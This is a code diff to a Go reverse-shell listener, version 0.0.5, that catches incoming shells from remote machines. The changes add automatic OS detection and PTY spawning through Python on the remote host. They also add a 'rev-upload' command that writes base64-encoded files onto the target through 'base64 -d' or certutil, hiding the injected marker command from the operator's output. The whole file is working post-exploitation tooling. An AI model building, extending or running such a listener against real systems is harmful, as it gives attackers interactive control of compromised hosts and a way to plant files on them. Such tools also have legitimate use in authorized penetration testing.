@@ -6,98 +6,59 @@ package main
 
 import (
 	"bufio"
+	"encoding/base64"
 	"flag"
 	"fmt"
 	"io"
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
-	"sync"
 	"syscall"
 	"time"
 )
 
 var ctrlCChan = make(chan os.Signal, 1)
-var backgroundCommand = "rev-bg"
-var sessionHelpCommand = "rev-help"
+var (
+	port                int  = 0
+	manualMode          bool = false // Flag to control PTY spawning
+	backgroundCommand        = "rev-bg"
+	sessionHelpCommand       = "rev-help"
+	revCommandIsRunning bool = false
+)
 
-// SessionManager handles concurrent access to sessions
-type SessionManager struct {
-	sync.RWMutex
-	sessions map[int]*Socket
-}
-
-func NewSessionManager() *SessionManager {
-	return &SessionManager{
-		sessions: make(map[int]*Socket),
-	}
-}
-
-func (sm *SessionManager) Add(id int, socket *Socket) {
-	sm.Lock()
-	defer sm.Unlock()
-	sm.sessions[id] = socket
-}
-
-func (sm *SessionManager) Get(id int) (*Socket, bool) {
-	sm.RLock()
-	defer sm.RUnlock()
-	socket, ok := sm.sessions[id]
-	return socket, ok
-}
-
-func (sm *SessionManager) Remove(id int) {
-	sm.Lock()
-	defer sm.Unlock()
-	delete(sm.sessions, id)
-}
-
-func (sm *SessionManager) Count() int {
-	sm.RLock()
-	defer sm.RUnlock()
-	return len(sm.sessions)
-}
-
-func (sm *SessionManager) List() []string {
-	sm.RLock()
-	defer sm.RUnlock()
-	var list []string
-	for _, client := range sm.sessions {
-		list = append(list, client.status())
-	}
-	return list
+func init() {
+	flag.IntVar(&port, "p", 4444, "Port to listen on")
+	flag.BoolVar(&manualMode, "m", false, "Manual mode (skip automatic PTY)")
+	flag.Parse()
 }
 
 func main() {
 	fmt.Println("=======================================")
 	fmt.Println(" Multithreaded Reverse Shell listener  ")
-	fmt.Println(" v0.0.3                                ")
+	fmt.Println(" v0.0.5                                ")
 	fmt.Println("=======================================")
 
 	// Keyboard signal notify
 	signal.Notify(ctrlCChan, os.Interrupt, syscall.SIGTERM, syscall.SIGINT)
 
 	var destinationPort string
-	sessions := NewSessionManager()
+	clients := map[int]*Socket{}
 
 	flag.Parse()
-	if flag.NFlag() == 0 && flag.NArg() == 0 {
-		fmt.Println("Usage: reverseshell-listener <port>")
-		os.Exit(1)
-	}
 
-	if _, err := strconv.Atoi(flag.Arg(0)); err != nil {
+	if port == 0 {
 		fmt.Println("[!] Port cannot be empty and not an integer")
 		os.Exit(1)
 	} else {
-		destinationPort = fmt.Sprintf(":%v", flag.Arg(0))
+		destinationPort = fmt.Sprintf(":%d", port)
 	}
 
 	fmt.Println("[+] Press Ctrl+C+Enter to quit this application")
 	fmt.Println("[+] Listening on port", destinationPort)
-	go connectionThread(destinationPort, sessions)
+	go connectionThread(destinationPort, clients)
 
 	reader := bufio.NewReader(os.Stdin)
 	connectedSession := 1
@@ -107,85 +68,52 @@ func main() {
 			fmt.Println("\n[+] Application quit successfully")
 			os.Exit(0)
 		default:
-			if sessions.Count() > 0 && connectedSession == 0 {
+			if len(clients) > 0 && connectedSession == 0 {
 				fmt.Print("listener> ")
 				text, _ := reader.ReadString('\n')
-				connectedSession = commandHandler(text, sessions)
-			} else if sessions.Count() > 0 && connectedSession != 0 {
-				if client, ok := sessions.Get(connectedSession); ok {
-					if !client.isClosed {
-						client.interact()
-					} else {
-						fmt.Println("[-] Session has been closed")
-						sessions.Remove(connectedSession)
-					}
+				connectedSession = commandHandler(text, clients)
+			} else if len(clients) > 0 && connectedSession != 0 {
+				if !clients[connectedSession].isClosed {
+					clients[connectedSession].interact()
 				} else {
-					fmt.Println("[-] No matched session found")
+					fmt.Println("[-] No matched session or session has been closed")
 				}
 				connectedSession = 0
-			} else {
-				time.Sleep(100 * time.Millisecond)
 			}
-			// Small sleep to yield
 			time.Sleep(1 * time.Microsecond)
 		}
 
 	}
 }
 
-func commandHandler(cmd string, sessions *SessionManager) int {
+func commandHandler(cmd string, clients map[int]*Socket) int {
 	connectedSession := 0
 
 	splitCommand := strings.Split(cmd, " ")
-	command := strings.TrimSuffix(splitCommand[0], "\n")
-
-	switch command {
+	switch strings.TrimSuffix(splitCommand[0], "\n") {
 	case "help":
 		fmt.Println("sessions \t- List sessions")
 		fmt.Println("session <num> \t- Get into session by ID")
-		fmt.Println("kill <num> \t- Kill a session by ID")
-		fmt.Println("exit \t\t- Exit the listener")
 	case "exit":
 		os.Exit(0)
 	case "sessions":
 		fmt.Println("--------------------------------------------------------------------->")
-		for _, status := range sessions.List() {
-			fmt.Println(status)
+		for _, client := range clients {
+			fmt.Println(client.status())
 		}
 		fmt.Println("<---------------------------------------------------------------------")
-	case "kill":
-		if len(splitCommand) > 1 {
-			targetSessionId, _ := strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
-			if socket, ok := sessions.Get(targetSessionId); ok {
-				socket.con.Close()
-				socket.isClosed = true
-				sessions.Remove(targetSessionId)
-				fmt.Printf("[+] Session %d killed\n", targetSessionId)
-			} else {
-				fmt.Println("[!] Session not found")
-			}
-		} else {
-			fmt.Println("[!] Usage: kill <session_id>")
-		}
-
 	case "session":
-		if len(splitCommand) > 1 {
-			targetSession, _ := strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
-			if _, ok := sessions.Get(targetSession); ok {
-				connectedSession = targetSession
-			} else {
-				fmt.Println("[!] Wrong session selected")
-				connectedSession = 0
-			}
-		} else {
-			fmt.Println("[!] Usage: session <session_id>")
+		connectedSession, _ = strconv.Atoi(strings.TrimSuffix(splitCommand[1], "\n"))
+		if connectedSession > len(clients) {
+			fmt.Println("[!] Wrong session selected")
+			connectedSession = 0
 		}
 	}
 
 	return connectedSession
 }
 
-func connectionThread(destPort string, sessions *SessionManager) {
+func connectionThread(destPort string, clients map[int]*Socket) {
 	listener, err := net.Listen("tcp", destPort)
 	if err != nil {
 		fmt.Println("[-]", err)
@@ -199,17 +127,40 @@ func connectionThread(destPort string, sessions *SessionManager) {
 			fmt.Println("[-] Error accepting:", err)
 		}
 		// Handle connections in a new goroutine.
-		// Check for existing ID collision (unlikely with increment, but good practice)
-		for {
-			if _, ok := sessions.Get(sessionId); !ok {
-				break
-			}
-			sessionId++
-		}
-
 		fmt.Println("[+] Got connection from <", con.RemoteAddr().String(), ">, Session ID:", sessionId)
 		socket := &Socket{sessionId: sessionId, con: con}
-		sessions.Add(sessionId, socket)
+
+		if !manualMode {
+			// Create system detector
+			detector := NewSystemDetector(con)
+
+			// Detect OS
+			socket.osType = detector.DetectOS()
+			fmt.Println("[+] Session " + strconv.Itoa(sessionId) + " detected OS: " + socket.osType)
+
+			// Check for Python versions if it's a Unix-like system
+			if socket.osType == "Linux" || socket.osType == "macOS" {
+				socket.pythonVersions = detector.DetectPythonVersions()
+
+				if len(socket.pythonVersions) > 0 {
+					fmt.Println("[+] Checking for shell availability...")
+					availableShell := detector.DetectShell()
+
+					if availableShell != "" {
+						detector.SpawnPTY(socket.pythonVersions, availableShell)
+					}
+				}
+			}
+			// Reset read deadline
+			con.SetReadDeadline(time.Time{})
+
+			// Send a newline to the connection
+			con.Write([]byte("\n"))
+		} else {
+			fmt.Println("[*] Manual mode enabled - skipping automatic execution")
+		}
+
+		clients[sessionId] = socket
 		sessionId = sessionId + 1
 	}
 }
@@ -218,15 +169,16 @@ func connectionThread(destPort string, sessions *SessionManager) {
 Socket
 */
 type Socket struct {
-	sessionId    int
-	con          net.Conn
-	isBackground bool
-	isClosed     bool
+	sessionId      int
+	con            net.Conn
+	isBackground   bool
+	isClosed       bool
+	osType         string
+	pythonVersions []string
 }
 
 func (s *Socket) interact() {
 	if !s.isClosed {
-		fmt.Printf("[!] Session %d was closed! \n", s.sessionId)
 		s.isBackground = false
 
 		fmt.Printf("[+] Interact with Session ID: %d \n", s.sessionId)
@@ -277,6 +229,10 @@ func (s *Socket) copyFromConnection(src io.Reader, dst io.Writer) <-chan int {
 					s.isClosed = true
 				}
 				break
+			}
+			// Not print to stdout if PWN_COMMAND is found
+			if strings.Contains(string(buf[0:nBytes]), PWNCommand) || revCommandIsRunning {
+				continue
 			}
 			_, err = dst.Write(buf[0:nBytes])
 			if err != nil && !s.isClosed {
@@ -373,19 +329,36 @@ func (s *Socket) readingFromStdin(src io.Reader, dst io.Writer) <-chan int {
 }
 
 func (s *Socket) prompt(message string, inputChan chan []byte) bool {
-	for {
+	maxRetries := 3
+	retryCount := 0
+
+	for retryCount < maxRetries {
 		if !s.isClosed && !s.isBackground {
 			fmt.Print(message + " (Y/N): ")
 			buf := <-inputChan
 			input := strings.TrimSuffix(string(buf), "\n")
 			input = strings.ToUpper(input)
+
+			// Handle empty input (Ctrl+D)
+			if input == "" {
+				fmt.Println("\n[!] Invalid input. Please enter Y or N.")
+				retryCount++
+				continue
+			}
+
 			if input == "Y" || input == "N" {
 				return input == "Y"
 			}
+
+			fmt.Println("[!] Invalid input. Please enter Y or N.")
+			retryCount++
 		} else {
 			return false
 		}
 	}
+
+	fmt.Println("[!] Maximum retries exceeded. Killing session.")
+	return true
 }
 
 func (s *Socket) status() string {
@@ -394,13 +367,22 @@ func (s *Socket) status() string {
 
 func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.Writer) bool {
 	myipCommand := "rev-myip"
+	uploadCommand := "rev-upload"
 
 	if strings.HasPrefix(command, "rev-") {
 		fmt.Println("<---------------------------------------------------------------------")
-		switch command {
+		// Split command and arguments
+		parts := strings.Fields(command)
+		cmd := parts[0]
+
+		// Set the flag to true
+		revCommandIsRunning = true
+
+		switch cmd {
 		case sessionHelpCommand:
 			fmt.Println(backgroundCommand, "- Background the session")
 			fmt.Println(myipCommand, "- Display host ip address")
+			fmt.Println(uploadCommand, " <file> - Upload a file to the remote host's current directory")
 		case backgroundCommand:
 			fmt.Println("[+] Move the current session to background..")
 			s.isBackground = true
@@ -423,11 +405,81 @@ func (s *Socket) inSessionCommandHandler(command string, src io.Reader, dst io.W
 					fmt.Println("[+] Address: [", ip, "] \t Interface: [", i.Name, "]")
 				}
 			}
+		case uploadCommand:
+			if len(parts) < 2 {
+				fmt.Println("[-] Usage:", uploadCommand, "<file>")
+				break
+			}
+
+			localPath := parts[1]
+			// Check if file exists
+			fileInfo, err := os.Stat(localPath)
+			if os.IsNotExist(err) {
+				fmt.Println("[-] File does not exist:", localPath)
+				break
+			}
+
+			// Read file content
+			fileContent, err := os.ReadFile(localPath)
+			if err != nil {
+				fmt.Println("[-] Error reading file:", err)
+				break
+			}
+
+			// Get filename from path
+			fileName := filepath.Base(localPath)
+
+			// Create a progress indicator
+			done := make(chan bool)
+			go func() {
+				seconds := 0
+				for {
+					select {
+					case <-done:
+						return
+					default:
+						// Simulate progress
+						time.Sleep(1000 * time.Millisecond)
+						seconds += 1
+						fmt.Printf("\r[+] %s ... (%ds)", fileName, seconds)
+					}
+				}
+			}()
+
+			// Create base64 encoded content
+			encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+
+			// Create upload command based on OS
+			var uploadCmd string
+			if s.osType == "Windows" {
+				uploadCmd = fmt.Sprintf("echo '%s' ; echo %s > temp.b64 && certutil -decode temp.b64 %s && del temp.b64", PWNCommand, encodedContent, fileName)
+			} else {
+				uploadCmd = fmt.Sprintf("echo '%s' ; echo %s | base64 -d > %s", PWNCommand, encodedContent, fileName)
+			}
+
+			// Show file size
+			fileSize := fileInfo.Size()
+			fmt.Printf("[+] Uploading %s (%d bytes)...\n", fileName, fileSize)
+
+			// Send upload command
+			if _, err := dst.Write([]byte(uploadCmd + "\n")); err != nil {
+				done <- true
+				fmt.Println("\n[-] Error sending upload command:", err)
+			} else {
+				done <- true
+				fmt.Println("\n[+] File upload completed, waiting for command execution...")
+			}
+
+		default:
+			revCommandIsRunning = false
 		}
 		fmt.Println("--------------------------------------------------------------------->")
 		return true
 	}
 
+	if revCommandIsRunning {
+		revCommandIsRunning = false
+	}
 	//Default
 	return false
 }
